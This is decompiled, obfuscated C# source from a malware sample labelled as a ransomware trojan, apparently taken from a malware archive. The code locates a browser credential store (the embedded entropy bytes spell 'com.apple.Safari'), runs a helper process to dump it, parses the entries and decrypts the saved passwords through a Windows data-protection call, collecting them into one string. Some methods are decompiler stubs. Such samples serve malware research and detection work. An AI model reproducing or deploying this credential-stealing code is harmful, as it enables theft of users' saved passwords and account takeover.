// Decompiled with JetBrains decompiler
// Type: .
// Assembly: smss, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: E062C21C-108A-4088-B8AD-F222EA4C3418
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-29f84241ce2d6a79cfefca98655fcd4fd54dd724bded5f239ceefec315a648b5.exe

using \u0004;
using \u0006;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

namespace \u0006
{
  internal class \u0001
  {
    public static string \u0001;

    public class \u0001
    {
      public static byte[] \u0001;
      [SpecialName]
      private static string[] \u0002;
      [NonSerialized]
      internal static \u0005 \u0018;

      static \u0001()
      {
        \u0002.\u0001(typeof (\u0001.\u0001));
        \u0001.\u0001.\u0001 = new byte[144]
        {
          (byte) 29,
          (byte) 172,
          (byte) 168,
          (byte) 248,
          (byte) 211,
          (byte) 184,
          (byte) 72,
          (byte) 62,
          (byte) 72,
          (byte) 125,
          (byte) 62,
          (byte) 10,
          (byte) 98,
          (byte) 7,
          (byte) 221,
          (byte) 38,
          (byte) 230,
          (byte) 103,
          (byte) 129,
          (byte) 3,
          (byte) 231,
          (byte) 178,
          (byte) 19,
          (byte) 165,
          (byte) 176,
          (byte) 121,
          (byte) 238,
          (byte) 79,
          (byte) 15,
          (byte) 65,
          (byte) 21,
          (byte) 237,
          (byte) 123,
          (byte) 20,
          (byte) 140,
          (byte) 229,
          (byte) 75,
          (byte) 70,
          (byte) 13,
          (byte) 193,
          (byte) 142,
          (byte) 254,
          (byte) 214,
          (byte) 231,
          (byte) 39,
          (byte) 117,
          (byte) 6,
          (byte) 139,
          (byte) 73,
          (byte) 0,
          (byte) 220,
          (byte) 15,
          (byte) 48,
          (byte) 160,
          (byte) 158,
          (byte) 253,
          (byte) 9,
          (byte) 133,
          (byte) 241,
          (byte) 200,
          (byte) 170,
          (byte) 117,
          (byte) 193,
          (byte) 8,
          (byte) 5,
          (byte) 121,
          (byte) 1,
          (byte) 226,
          (byte) 151,
          (byte) 216,
          (byte) 175,
          (byte) 128,
          (byte) 56,
          (byte) 96,
          (byte) 11,
          (byte) 113,
          (byte) 14,
          (byte) 104,
          (byte) 83,
          (byte) 119,
          (byte) 47,
          (byte) 15,
          (byte) 97,
          (byte) 246,
          (byte) 29,
          (byte) 142,
          (byte) 143,
          (byte) 92,
          (byte) 178,
          (byte) 61,
          (byte) 33,
          (byte) 116,
          (byte) 64,
          (byte) 75,
          (byte) 181,
          (byte) 6,
          (byte) 110,
          (byte) 171,
          (byte) 122,
          (byte) 189,
          (byte) 139,
          (byte) 169,
          (byte) 126,
          (byte) 50,
          (byte) 143,
          (byte) 110,
          (byte) 6,
          (byte) 36,
          (byte) 217,
          (byte) 41,
          (byte) 164,
          (byte) 165,
          (byte) 190,
          (byte) 38,
          (byte) 35,
          (byte) 253,
          (byte) 238,
          (byte) 241,
          (byte) 76,
          (byte) 15,
          (byte) 116,
          (byte) 94,
          (byte) 88,
          (byte) 251,
          (byte) 145,
          (byte) 116,
          (byte) 239,
          (byte) 145,
          (byte) 99,
          (byte) 111,
          (byte) 109,
          (byte) 46,
          (byte) 97,
          (byte) 112,
          (byte) 112,
          (byte) 108,
          (byte) 101,
          (byte) 46,
          (byte) 83,
          (byte) 97,
          (byte) 102,
          (byte) 97,
          (byte) 114,
          (byte) 105
        };
      }

      public static IntPtr \u0001([In] IntPtr obj0)
      {
        IntPtr num;
        return num;
      }

      public static bool \u0001(
        [In] ref \u0001.\u0001.\u0001 obj0,
        [In] string obj1,
        [In] ref \u0001.\u0001.\u0001 obj2,
        [In] IntPtr obj3,
        [In] ref IntPtr obj4,
        [In] int obj5,
        [In] ref \u0001.\u0001.\u0001 obj6)
      {
        bool flag;
        return flag;
      }

      public static \u0001.\u0001.\u0002[] \u0001()
      {
        \u0001.\u0001.\u0002[] objArray;
        try
        {
          string str1 = \u0011.\u0081(\u0010.\u0080(Environment.SpecialFolder.ProgramFiles), \u0001.\u0001(\u0001.\u0001.\u0018(11413), \u0001.\u0001.\u0018(471)));
          string str2 = \u0011.\u0081(\u0010.\u0080(Environment.SpecialFolder.ApplicationData), \u0001.\u0001(\u0001.\u0001.\u0018(11518), \u0001.\u0001.\u0018(471)));
          string str3 = (string) null;
          objArray = \u0001.\u0001.\u0001(str1, str2, ref str3) ? \u0001.\u0001.\u0001(\u0083\u0002.\u007E\u007F\u0003((object) str3, checked (\u0003.\u007E\u0004((object) str3) - 2))).ToArray() : (\u0001.\u0001.\u0002[]) null;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          \u000F.\u001D();
        }
        return objArray;
      }

      public static List<\u0001.\u0001.\u0002> \u0001([In] string obj0)
      {
        string input = File.ReadAllText(obj0);
        List<\u0001.\u0001.\u0002> objList = new List<\u0001.\u0001.\u0002>();
        try
        {
          int num = checked (\u0001.\u0001.\u0001<string[]>(ref \u0001.\u0001.\u0002, Regex.Split(Regex.Split(input, \u0001.\u0001(\u0001.\u0001.\u0018(11599), \u0001.\u0001.\u0018(471)))[1], \u0001.\u0001(\u0001.\u0001.\u0018(11616), \u0001.\u0001.\u0018(471)))).Length - 1);
          int index = 1;
          while (index <= num)
          {
            \u0001.\u0001.\u0002 obj = new \u0001.\u0001.\u0002()
            {
              \u0001 = \u0001.\u0001.\u0001(\u0001.\u0001.\u0002[index], \u0001.\u0001(\u0001.\u0001.\u0018(11633), \u0001.\u0001.\u0018(471)), \u0001.\u0001(\u0001.\u0001.\u0018(11650), \u0001.\u0001.\u0018(471)), 0),
              \u000F = int.Parse(\u0001.\u0001.\u0001(\u0001.\u0001.\u0002[index], \u0001.\u0001(\u0001.\u0001.\u0018(11675), \u0001.\u0001.\u0018(471)), \u0001.\u0001(\u0001.\u0001.\u0018(11700), \u0001.\u0001.\u0018(471)), 0)),
              \u0007 = \u0001.\u0001.\u0001(\u0001.\u0001.\u0002[index], \u0001.\u0001(\u0001.\u0001.\u0018(11633), \u0001.\u0001.\u0018(471)), \u0001.\u0001(\u0001.\u0001.\u0018(11650), \u0001.\u0001.\u0018(471)), 1),
              \u0002 = \u0001.\u0001.\u0001(\u0001.\u0001.\u0002[index], \u0001.\u0001(\u0001.\u0001.\u0018(11725), \u0001.\u0001.\u0018(471)), \u0001.\u0001(\u0001.\u0001.\u0018(11742), \u0001.\u0001.\u0018(471)), 0),
              \u0004 = \u0001.\u0001.\u0001(\u0001.\u0001.\u0002[index], \u0001.\u0001(\u0001.\u0001.\u0018(11633), \u0001.\u0001.\u0018(471)), \u0001.\u0001(\u0001.\u0001.\u0018(11650), \u0001.\u0001.\u0018(471)), 2),
              \u0005 = \u0001.\u0001.\u0001(\u0001.\u0001.\u0002[index], \u0001.\u0001(\u0001.\u0001.\u0018(11633), \u0001.\u0001.\u0018(471)), \u0001.\u0001(\u0001.\u0001.\u0018(11650), \u0001.\u0001.\u0018(471)), 3),
              \u0006 = \u0001.\u0001.\u0001(\u0001.\u0001.\u0002[index], \u0001.\u0001(\u0001.\u0001.\u0018(11633), \u0001.\u0001.\u0018(471)), \u0001.\u0001(\u0001.\u0001.\u0018(11650), \u0001.\u0001.\u0018(471)), 4),
              \u0010 = int.Parse(\u0001.\u0001.\u0001(\u0001.\u0001.\u0002[index], \u0001.\u0001(\u0001.\u0001.\u0018(11675), \u0001.\u0001.\u0018(471)), \u0001.\u0001(\u0001.\u0001.\u0018(11700), \u0001.\u0001.\u0018(471)), 1)),
              \u000E = int.Parse(\u0001.\u0001.\u0001(\u0001.\u0001.\u0002[index], \u0001.\u0001(\u0001.\u0001.\u0018(11675), \u0001.\u0001.\u0018(471)), \u0001.\u0001(\u0001.\u0001.\u0018(11700), \u0001.\u0001.\u0018(471)), 2)),
              \u0008 = \u0001.\u0001.\u0001(\u0001.\u0001.\u0002[index], \u0001.\u0001(\u0001.\u0001.\u0018(11633), \u0001.\u0001.\u0018(471)), \u0001.\u0001(\u0001.\u0001.\u0018(11650), \u0001.\u0001.\u0018(471)), 5),
              \u0011 = checked (index - 1)
            };
            obj.\u0003 = \u0001.\u0001.\u0001(Convert.FromBase64String(obj.\u0002));
            objList.Add(obj);
            checked { ++index; }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        return objList;
      }

      public void \u0001()
      {
        try
        {
          \u0001.\u0001.\u0002[] objArray1 = \u0001.\u0001.\u0001();
          \u0001.\u0001 = \u0001.\u0001(\u0001.\u0001.\u0018(11759), \u0001.\u0001.\u0018(471));
          \u0001.\u0001.\u0002[] objArray2 = objArray1;
          int index = 0;
          while (index < objArray2.Length)
          {
            \u0001.\u0001.\u0002 obj = objArray2[index];
            \u0001.\u0001 = \u008C.\u001B\u0002(\u0001.\u0001, \u008B.\u001A\u0002(), \u0001.\u0001(\u0001.\u0001.\u0018(11897), \u0001.\u0001.\u0018(471)), obj.\u0001);
            string[] strArray = new string[5]
            {
              \u0001.\u0001,
              \u008B.\u001A\u0002(),
              \u0001.\u0001(\u0001.\u0001.\u0018(11922), \u0001.\u0001.\u0018(471)),
              obj.\u0003,
              \u008B.\u001A\u0002()
            };
            \u0001.\u0001 = \u008D.\u001C\u0002(strArray);
            checked { ++index; }
          }
          \u0001.\u0001 = \u0095.\u0083\u0002(\u0001.\u0001, \u008B.\u001A\u0002(), \u0001.\u0001(\u0001.\u0001.\u0018(11947), \u0001.\u0001.\u0018(471)));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          \u000F.\u001D();
        }
      }

      public static string \u0001([In] byte[] obj0)
      {
        string str;
        try
        {
          IntPtr num1 = \u0087\u0002.\u0083\u0003(checked (obj0.Length + 4));
          \u009C\u0002.\u009D\u0003(obj0, 0, num1, obj0.Length);
          IntPtr num2 = \u0087\u0002.\u0083\u0003(\u0001.\u0001.\u0001.Length);
          \u009C\u0002.\u009D\u0003(\u0001.\u0001.\u0001, 0, num2, \u0001.\u0001.\u0001.Length);
          \u0001.\u0001.\u0001 obj1;
          obj1.\u0001 = obj0.Length;
          obj1.\u0002 = num1;
          \u0001.\u0001.\u0001 obj2;
          obj2.\u0001 = \u0001.\u0001.\u0001.Length;
          obj2.\u0002 = num2;
          ref \u0001.\u0001.\u0001 local1 = ref obj1;
          ref \u0001.\u0001.\u0001 local2 = ref obj2;
          IntPtr zero1 = IntPtr.Zero;
          IntPtr zero2 = IntPtr.Zero;
          ref IntPtr local3 = ref zero2;
          \u0001.\u0001.\u0001 obj3;
          ref \u0001.\u0001.\u0001 local4 = ref obj3;
          if (!\u0001.\u0001.\u0001(ref local1, (string) null, ref local2, zero1, ref local3, 0, ref local4))
          {
            str = (string) null;
          }
          else
          {
            \u0095\u0002.\u0095\u0003(num1);
            \u0095\u0002.\u0095\u0003(num2);
            int num3 = \u0088\u0002.\u0086\u0003(obj3.\u0002);
            byte[] numArray = new byte[checked (num3 + 1)];
            obj3.\u0002 = new IntPtr(checked (obj3.\u0002.ToInt32() + 4));
            \u0016\u0002.\u0008\u0003(obj3.\u0002, numArray, 0, num3);
            \u0001.\u0001.\u0001(obj3.\u0002);
            char[] chArray = new char[checked (num3 - 1 + 1)];
            int num4 = checked (num3 - 1);
            int index = 0;
            while (index <= num4)
            {
              chArray[index] = \u0006\u0003.\u0010\u0004((int) numArray[index]);
              checked { ++index; }
            }
            str = new string(chArray);
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          \u000F.\u001D();
        }
        return str;
      }

      public static bool \u0001([In] string obj0, [In] string obj1, [In] ref string obj2)
      {
        bool flag;
        try
        {
          obj2 = (string) null;
          if (!\u0012.\u0083(obj0))
          {
            flag = false;
          }
          else
          {
            Process process = new Process();
            \u0088.\u007E\u0014\u0002((object) \u001E\u0003.\u007E\u0083\u0004((object) process), obj0);
            \u0088 obj = \u0088.\u007E\u0015\u0002;
            ProcessStartInfo processStartInfo = \u001E\u0003.\u007E\u0083\u0004((object) process);
            string[] strArray = new string[5]
            {
              \u0001.\u0001.\u0018(12085),
              \u0001.\u0001.\u0001<string>(ref obj2, \u0011.\u0081(\u009E.\u0091\u0002(global::\u0004.\u007E\u0017((object) \u001F\u0003.\u0084\u0004())), \u0001.\u0001.\u0018(12118))),
              \u0001.\u0001.\u0018(12147),
              obj1,
              \u0001.\u0001.\u0018(12147)
            };
            string str = \u008D.\u001C\u0002(strArray);
            obj((object) processStartInfo, str);
            \u001A.\u007E\u0098((object) \u001E\u0003.\u007E\u0083\u0004((object) process), true);
            \u001A.\u007E\u0099((object) \u001E\u0003.\u007E\u0083\u0004((object) process), true);
            \u001A.\u007E\u009A((object) \u001E\u0003.\u007E\u0083\u0004((object) process), false);
            int num = \u0017.\u007E\u008B((object) process) ? 1 : 0;
            \u0018.\u007E\u008E((object) process);
            flag = \u0003.\u007E\u0004((object) global::\u0004.\u007E\u0010((object) \u007F\u0003.\u007E\u0086\u0004((object) process))) == 0;
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          \u000F.\u001D();
        }
        return flag;
      }

      public static string \u0001([In] string obj0, [In] string obj1, [In] string obj2, [In] int obj3)
      {
        string str1;
        try
        {
          string str2 = \u0080\u0003.\u0087\u0004(obj0, obj1)[checked (obj3 + 1)];
          str1 = \u0080\u0003.\u0087\u0004(str2, obj2)[0];
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          \u000F.\u001D();
        }
        return str1;
      }

      public static \u0001 \u0001<\u0001>([In] ref \u0001 obj0, [In] \u0001 obj1)
      {
        \u0001 obj;
        try
        {
          obj0 = obj1;
          obj = obj1;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        return obj;
      }

      public struct \u0001
      {
        public int \u0001;
        public IntPtr \u0002;
      }

      public struct \u0002
      {
        public string \u0001;
        public string \u0002;
        public string \u0003;
        public string \u0004;
        public string \u0005;
        public string \u0006;
        public string \u0007;
        public string \u0008;
        public int \u000E;
        public int \u000F;
        public int \u0010;
        public int \u0011;
      }
    }
  }
}
